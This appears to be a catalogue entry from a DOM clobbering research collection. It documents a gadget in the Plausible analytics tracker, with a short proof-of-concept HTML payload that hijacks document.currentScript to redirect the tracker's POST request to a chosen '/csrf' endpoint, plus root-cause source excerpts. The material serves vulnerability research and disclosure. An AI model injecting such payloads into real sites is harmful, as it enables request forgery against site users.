---
description: Simple, open source, lightweight and privacy-friendly web analytics alternative to Google Analytics.
github: plausible/analytics
gadgets:
  Latest:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - data-attr
      - before-lib-load
    pocs:
      - description: The [plausible-analytics](https://github.com/plausible/analytics)'s library uses the `data-domain` and `data-api` attribute of the `document.currentScript` element as a URL reference for a POST request.
        code: |
          <!-- user input -->
          <img name="currentScript" data-domain="[current-location]" data-api="[current-location]/csrf">

          <script defer data-domain="mydomain.com" src="https://plausible.io/js/script.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/plausible/analytics/blob/c92e0afc17c414079d57dfc909bc48a22df95a42/tracker/src/config.js#L7">https://github.com/plausible/analytics/blob/c92e0afc17c414079d57dfc909bc48a22df95a42/tracker/src/config.js#L7</a>

      ```javascript
      var location = window.location
      var document = window.document

      if (COMPILE_COMPAT) {
        var scriptEl = document.getElementById('plausible')
      } else if (COMPILE_PLAUSIBLE_LEGACY_VARIANT) {
        var scriptEl = document.currentScript
      }

      // [...]

      config.endpoint = scriptEl.getAttribute('data-api') || defaultEndpoint()
      config.domain = scriptEl.getAttribute('data-domain')
      config.logging = true
      ```

      Source: <a target="_blank" href="https://github.com/plausible/analytics/blob/c92e0afc17c414079d57dfc909bc48a22df95a42/tracker/src/track.js#L126">https://github.com/plausible/analytics/blob/c92e0afc17c414079d57dfc909bc48a22df95a42/tracker/src/track.js#L126</a>

      ```javascript
      sendRequest(config.endpoint, payload, options)
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/plausible-analytics.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
